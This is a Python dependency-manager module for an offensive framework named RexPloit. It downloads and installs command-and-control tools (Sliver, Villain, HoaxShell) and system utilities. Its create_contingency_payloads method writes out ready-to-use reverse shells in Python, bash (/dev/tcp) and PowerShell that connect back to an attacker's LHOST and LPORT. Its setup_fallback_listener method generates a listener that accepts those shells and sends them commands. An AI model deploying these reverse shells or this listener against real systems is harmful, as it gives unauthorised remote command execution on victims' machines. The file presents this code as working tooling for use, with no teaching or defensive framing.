#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Dependency Manager for RexPloit
Handles automatic installation of required tools and dependencies
Provides fallback methods and contingency replacement tools
"""

import os
import sys
import shutil
import platform
import subprocess
import tempfile
import tarfile
import zipfile
import requests
import json
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

# Console for rich output
console = Console()

class DependencyManager:
    """Manages dependencies for RexPloit Framework"""
    
    def __init__(self, config_dir="config", c2_dir="c2_frameworks"):
        self.config_dir = config_dir
        self.c2_dir = c2_dir
        self.dependencies_file = os.path.join(config_dir, "dependencies.json")
        self.temp_dir = tempfile.mkdtemp()
        
        # Ensure directories exist
        os.makedirs(config_dir, exist_ok=True)
        os.makedirs(c2_dir, exist_ok=True)
        
        # Create default dependencies file if it doesn't exist
        if not os.path.exists(self.dependencies_file):
            self._create_default_dependencies()
            
    def __del__(self):
        """Clean up temporary files"""
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass
            
    def _create_default_dependencies(self):
        """Create default dependencies configuration"""
        default_deps = {
            "python_packages": [
                {"name": "rich", "version": ">=12.0.0", "required": True, "fallback": None},
                {"name": "textual", "version": ">=0.10.0", "required": True, "fallback": None},
                {"name": "requests", "version": ">=2.25.0", "required": True, "fallback": None},
                {"name": "urllib3", "version": ">=1.26.0", "required": True, "fallback": None}
            ],
            "c2_frameworks": [
                {
                    "name": "sliver",
                    "required": False,
                    "download_url": "https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux",
                    "install_path": "sliver/sliver-client",
                    "fallback": "villain",
                    "check_command": "which sliver-server"
                },
                {
                    "name": "villain",
                    "required": False,
                    "download_url": "https://github.com/t3l3machus/Villain/archive/refs/heads/main.zip",
                    "install_path": "Villain",
                    "fallback": "hoaxshell",
                    "check_command": "test -d Villain"
                },
                {
                    "name": "hoaxshell",
                    "required": False,
                    "download_url": "https://github.com/t3l3machus/hoaxshell/archive/refs/heads/main.zip",
                    "install_path": "HoaxShell",
                    "fallback": None,
                    "check_command": "test -d HoaxShell"
                }
            ],
            "system_tools": [
                {"name": "curl", "required": True, "install_command": "apt-get install -y curl", "check_command": "which curl"},
                {"name": "wget", "required": True, "install_command": "apt-get install -y wget", "check_command": "which wget"},
                {"name": "git", "required": True, "install_command": "apt-get install -y git", "check_command": "which git"},
                {"name": "nmap", "required": False, "install_command": "apt-get install -y nmap", "check_command": "which nmap"}
            ]
        }
        
        with open(self.dependencies_file, 'w') as f:
            json.dump(default_deps, f, indent=4)
            
    def load_dependencies(self):
        """Load dependencies from configuration file"""
        try:
            with open(self.dependencies_file, 'r') as f:
                return json.load(f)
        except Exception as e:
            console.print(f"[bold red]Error loading dependencies file: {str(e)}[/bold red]")
            self._create_default_dependencies()
            with open(self.dependencies_file, 'r') as f:
                return json.load(f)
                
    def _check_python_package(self, pkg):
        """Check if a specific Python package is installed"""
        try:
            if pkg["version"]:
                __import__("pkg_resources").require([f"{pkg['name']}{pkg['version']}"])
            else:
                __import__(pkg["name"])
            return True
        except Exception:
            return False
            
    def check_python_packages(self, auto_install=True):
        """Check required Python packages"""
        deps = self.load_dependencies()
        missing_packages = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
        ) as progress:
            task = progress.add_task("[cyan]Checking Python packages...", total=len(deps["python_packages"]))
            
            for pkg in deps["python_packages"]:
                progress.update(task, description=f"[cyan]Checking {pkg['name']}...")
                
                if not self._check_python_package(pkg):
                    missing_packages.append(pkg)
                    
                progress.update(task, advance=1)
                
        if missing_packages:
            console.print(f"[yellow]Missing {len(missing_packages)} Python packages[/yellow]")
            
            if auto_install:
                self.install_python_packages(missing_packages)
            else:
                console.print(Panel(
                    "\n".join([f"- {pkg['name']}{pkg['version'] or ''}" for pkg in missing_packages]),
                    title="Missing Python Packages",
                    border_style="yellow"
                ))
                
            return False
        else:
            console.print("[green]All Python packages are installed[/green]")
            return True
            
    def install_python_packages(self, packages):
        """Install missing Python packages"""
        console.print("[cyan]Installing missing Python packages...[/cyan]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=False,
        ) as progress:
            task = progress.add_task("[cyan]Installing packages...", total=len(packages))
            
            for pkg in packages:
                pkg_spec = f"{pkg['name']}{pkg['version'] or ''}"
                progress.update(task, description=f"[cyan]Installing {pkg_spec}...")
                
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg_spec])
                    progress.update(task, description=f"[green]Installed {pkg_spec}")
                except subprocess.CalledProcessError:
                    progress.update(task, description=f"[red]Failed to install {pkg_spec}")
                    
                    # Try fallback if specified
                    if pkg["fallback"]:
                        fallback_spec = pkg["fallback"]
                        progress.update(task, description=f"[yellow]Trying fallback {fallback_spec}...")
                        try:
                            subprocess.check_call([sys.executable, "-m", "pip", "install", fallback_spec])
                            progress.update(task, description=f"[green]Installed fallback {fallback_spec}")
                        except:
                            progress.update(task, description=f"[red]Fallback installation failed for {pkg_spec}")
                            
                progress.update(task, advance=1)
                
        # Check if all packages are now installed
        missing = []
        for pkg in packages:
            try:
                __import__(pkg["name"])
            except ImportError:
                missing.append(pkg["name"])
                
        if missing:
            console.print(f"[bold red]Failed to install: {', '.join(missing)}[/bold red]")
            return False
        else:
            console.print("[bold green]All packages installed successfully[/bold green]")
            return True
            
    def _check_c2_framework(self, framework):
        """Check if a specific C2 framework is installed"""
        check_cmd = framework["check_command"]
        try:
            result = subprocess.run(check_cmd, shell=True, capture_output=True)
            return result.returncode == 0
        except:
            return False
            
    def check_c2_frameworks(self, auto_install=True):
        """Check required C2 frameworks"""
        deps = self.load_dependencies()
        missing_frameworks = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
        ) as progress:
            task = progress.add_task("[cyan]Checking C2 frameworks...", total=len(deps["c2_frameworks"]))
            
            for framework in deps["c2_frameworks"]:
                progress.update(task, description=f"[cyan]Checking {framework['name']}...")
                
                # Check if framework is installed
                if not self._check_c2_framework(framework):
                    missing_frameworks.append(framework)
                    
                progress.update(task, advance=1)
                
        if missing_frameworks:
            console.print(f"[yellow]Missing {len(missing_frameworks)} C2 frameworks[/yellow]")
            
            if auto_install:
                self.install_c2_frameworks(missing_frameworks)
            else:
                console.print(Panel(
                    "\n".join([f"- {framework['name']}" for framework in missing_frameworks]),
                    title="Missing C2 Frameworks",
                    border_style="yellow"
                ))
                
            return False
        else:
            console.print("[green]All C2 frameworks are installed[/green]")
            return True
            
    def install_c2_frameworks(self, frameworks):
        """Install missing C2 frameworks"""
        console.print("[cyan]Installing missing C2 frameworks...[/cyan]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=False,
        ) as progress:
            task = progress.add_task("[cyan]Installing frameworks...", total=len(frameworks))
            
            for framework in frameworks:
                progress.update(task, description=f"[cyan]Installing {framework['name']}...")
                
                try:
                    self._download_and_install_framework(framework, progress)
                    progress.update(task, description=f"[green]Installed {framework['name']}")
                except Exception as e:
                    progress.update(task, description=f"[red]Failed to install {framework['name']}: {str(e)}")
                    
                    # Try fallback if specified
                    if framework["fallback"]:
                        fallback = framework["fallback"]
                        for fb_framework in frameworks:
                            if fb_framework["name"] == fallback:
                                progress.update(task, description=f"[yellow]Trying fallback {fallback}...")
                                try:
                                    self._download_and_install_framework(fb_framework, progress)
                                    progress.update(task, description=f"[green]Installed fallback {fallback}")
                                except:
                                    progress.update(task, description=f"[red]Fallback installation failed for {fallback}")
                                break
                                
                progress.update(task, advance=1)
                
    def _download_and_install_framework(self, framework, progress):
        """Download and install a C2 framework"""
        name = framework["name"]
        url = framework["download_url"]
        install_path = os.path.join(self.c2_dir, framework["install_path"])
        
        # Create framework directory
        os.makedirs(os.path.dirname(install_path), exist_ok=True)
        
        # Download file
        progress.update(None, description=f"[cyan]Downloading {name}...")
        local_file = os.path.join(self.temp_dir, os.path.basename(url))
        
        response = requests.get(url, stream=True)
        with open(local_file, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                
        # Extract or copy file
        progress.update(None, description=f"[cyan]Extracting {name}...")
        
        if url.endswith('.zip'):
            with zipfile.ZipFile(local_file, 'r') as zip_ref:
                zip_ref.extractall(self.c2_dir)
        elif url.endswith('.tar.gz') or url.endswith('.tgz'):
            with tarfile.open(local_file, 'r:gz') as tar:
                tar.extractall(self.c2_dir)
        else:
            # Binary file, just copy
            shutil.copy(local_file, install_path)
            os.chmod(install_path, 0o755)  # Make executable
            
        # Check if installation was successful
        check_cmd = framework["check_command"]
        current_dir = os.getcwd()
        os.chdir(self.c2_dir)
        
        try:
            result = subprocess.run(check_cmd, shell=True, capture_output=True)
            if result.returncode != 0:
                raise Exception(f"Installation check failed for {name}")
        finally:
            os.chdir(current_dir)
            
    def _check_system_tool(self, tool):
        """Check if a specific system tool is installed"""
        check_cmd = tool["check_command"]
        try:
            result = subprocess.run(check_cmd, shell=True, capture_output=True)
            return result.returncode == 0
        except:
            return False
            
    def check_system_tools(self, auto_install=True):
        """Check required system tools"""
        deps = self.load_dependencies()
        missing_tools = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
        ) as progress:
            task = progress.add_task("[cyan]Checking system tools...", total=len(deps["system_tools"]))
            
            for tool in deps["system_tools"]:
                progress.update(task, description=f"[cyan]Checking {tool['name']}...")
                
                # Check if tool is installed
                if not self._check_system_tool(tool):
                    missing_tools.append(tool)
                    
                progress.update(task, advance=1)
                
        if missing_tools:
            console.print(f"[yellow]Missing {len(missing_tools)} system tools[/yellow]")
            
            if auto_install:
                self.install_system_tools(missing_tools)
            else:
                console.print(Panel(
                    "\n".join([f"- {tool['name']}" for tool in missing_tools]),
                    title="Missing System Tools",
                    border_style="yellow"
                ))
                
            return False
        else:
            console.print("[green]All system tools are installed[/green]")
            return True
            
    def install_system_tools(self, tools):
        """Install missing system tools"""
        console.print("[cyan]Installing missing system tools...[/cyan]")
        
        # Check if running as root or with sudo
        if os.geteuid() != 0:
            console.print("[bold red]Error: Root privileges required to install system tools.[/bold red]")
            console.print("[yellow]Try running with sudo or as root.[/yellow]")
            return False
            
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=False,
        ) as progress:
            task = progress.add_task("[cyan]Installing tools...", total=len(tools))
            
            for tool in tools:
                progress.update(task, description=f"[cyan]Installing {tool['name']}...")
                
                try:
                    subprocess.check_call(tool["install_command"], shell=True)
                    progress.update(task, description=f"[green]Installed {tool['name']}")
                except subprocess.CalledProcessError:
                    progress.update(task, description=f"[red]Failed to install {tool['name']}")
                    
                progress.update(task, advance=1)
                
        # Check if all tools are now installed
        missing = []
        for tool in tools:
            try:
                result = subprocess.run(tool["check_command"], shell=True, capture_output=True)
                if result.returncode != 0:
                    missing.append(tool["name"])
            except:
                missing.append(tool["name"])
                
        if missing:
            console.print(f"[bold red]Failed to install: {', '.join(missing)}[/bold red]")
            return False
        else:
            console.print("[bold green]All tools installed successfully[/bold green]")
            return True
            
    def check_all_dependencies(self, auto_install=True):
        """Check all dependencies"""
        console.print(Panel("[bold blue]RexPloit Dependency Manager[/bold blue]", border_style="blue"))
        
        system_tools_ok = self.check_system_tools(auto_install)
        python_packages_ok = self.check_python_packages(auto_install)
        c2_frameworks_ok = self.check_c2_frameworks(auto_install)
        
        if system_tools_ok and python_packages_ok and c2_frameworks_ok:
            console.print("[bold green]All dependencies satisfied![/bold green]")
            return True
        else:
            console.print("[bold yellow]Some dependencies are missing.[/bold yellow]")
            if not auto_install:
                console.print("Run with --install to automatically install missing dependencies.")
            return False
            
    def create_contingency_payloads(self):
        """Create contingency payloads for fallback scenarios"""
        console.print("[cyan]Generating contingency payloads...[/cyan]")
        
        payloads_dir = "payloads/contingency"
        os.makedirs(payloads_dir, exist_ok=True)
        
        # Generate fallback payloads for different scenarios
        contingency_payloads = {
            "minimal_python_reverse_tcp.py": """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""",
            
            "minimal_bash_reverse_tcp.sh": """bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1""",
            
            "minimal_powershell_reverse_tcp.ps1": """$client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
        }
        
        for filename, content in contingency_payloads.items():
            filepath = os.path.join(payloads_dir, filename)
            with open(filepath, 'w') as f:
                f.write(content)
                
        console.print(f"[green]Created {len(contingency_payloads)} contingency payloads[/green]")
        
    def setup_fallback_listener(self, host="0.0.0.0", port=4444):
        """Setup fallback listener when C2 frameworks fail"""
        console.print(f"[cyan]Setting up fallback listener on {host}:{port}...[/cyan]")
        
        try:
            # Create simple Python listener script
            listener_script = f"""#!/usr/bin/env python3
# RexPloit Fallback Listener
import socket
import threading
import sys
import os

def handle_client(client_socket, addr):
    print(f"\\n[*] Connection from {{addr[0]}}:{{addr[1]}}")
    while True:
        try:
            cmd = input("shell> ")
            if cmd.lower() == "exit":
                break
            client_socket.send(cmd.encode('utf-8') + b'\\n')
            response = client_socket.recv(4096).decode('utf-8')
            print(response, end="")
        except Exception as e:
            print(f"[!] Error: {{str(e)}}")
            break
    client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(("{host}", {port}))
        server.listen(5)
        print(f"[*] Fallback listener running on {host}:{port}")
        
        while True:
            client, addr = server.accept()
            client_handler = threading.Thread(target=handle_client, args=(client, addr))
            client_handler.daemon = True
            client_handler.start()
    except KeyboardInterrupt:
        print("\\n[*] Shutting down...")
    except Exception as e:
        print(f"[!] Error: {{str(e)}}")
    finally:
        server.close()
        sys.exit(0)

if __name__ == "__main__":
    main()
"""
            
            listener_path = os.path.join(self.c2_dir, "fallback_listener.py")
            with open(listener_path, 'w') as f:
                f.write(listener_script)
                
            os.chmod(listener_path, 0o755)  # Make executable
            
            console.print(f"[green]Fallback listener script created at {listener_path}[/green]")
            return listener_path
            
        except Exception as e:
            console.print(f"[bold red]Failed to setup fallback listener: {str(e)}[/bold red]")
            return None

# If run directly, check dependencies
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="RexPloit Dependency Manager")
    parser.add_argument("--install", action="store_true", help="Automatically install missing dependencies")
    parser.add_argument("--contingency", action="store_true", help="Create contingency payloads")
    parser.add_argument("--listener", action="store_true", help="Setup fallback listener")
    
    args = parser.parse_args()
    
    manager = DependencyManager()
    manager.check_all_dependencies(args.install)
    
    if args.contingency:
        manager.create_contingency_payloads()
        
    if args.listener:
        manager.setup_fallback_listener()